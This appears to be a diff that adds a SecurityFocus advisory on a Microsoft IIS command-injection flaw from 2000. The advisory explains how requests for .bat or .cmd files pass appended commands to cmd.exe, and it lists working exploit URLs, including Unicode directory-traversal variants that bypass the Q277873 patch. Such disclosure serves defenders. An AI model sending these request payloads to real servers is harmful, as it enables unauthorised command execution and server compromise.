@@ -1,0 +1,27 @@
+source: http://www.securityfocus.com/bid/1912/info
+
+When Microsoft IIS receives a valid request for an executable file, the filename is then passed onto the underlying operating system which executes the file. In the event that IIS receives a specially formed request for an executable file followed by operating system commands, IIS will proceed to process the entire string rather than rejecting it. Thus, a malicious user may perform system commands through cmd.exe under the context of the IUSR_machinename account which could possibly lead to privilege escalation, deletion, addition, and modification of files, or full compromise of the server.
+
+In order to establish successful exploitation, the file requested must be an existing .bat or .cmd file residing in a folder that the user possesses executable permissions to.
+
+Update (November 27, 2000): Georgi Guninski has discovered new variants of this vulnerability that have appeared after applying the patch (Q277873) supplied by Microsoft. Please see 'Exploit' for further details.
+
+Update (December 7, 2000): Billy Nothern has discovered that the commands can also be parsed through ActiveState Perl. Please see his Bugtraq posted located under 'Credit' for further information.
+
+**UPDATE**: It is believed that an aggressive worm may be in the wild that actively exploits this vulnerability.
+
+The following HTTP requests will display a directory listing for C:\.
+
+http://target/scripts/file.bat"+&+dir+c:/+.exe (IIS 5.0)
+http://target/scripts/file.bat"+&+dir+c:/+.com
+
+http://target/scripts/file.bat"+"&+dir+c:/+.exe (IIS 4.0)
+
+http://target/scripts/a.bat"+".exe?+&+dir
+
+http://target/scripts/..%c1%1c../..%c1%1c../mssql7/install/pubtext.bat"+&+dir+c:\+.exe
+
+The following URLs apply to IIS 5.0 after the patch (Q277873) provided by Microsoft is installed:
+
+http://target/scripts/file.bat/..%C1%9C..%C1%9C..%C1%9Cwinnt/system32/cmd.exe?/c%20dir%20C:
+http://target/scripts/georgi.asp/..%C1%9C..%C1%9C..%C1%9Cfile.ext
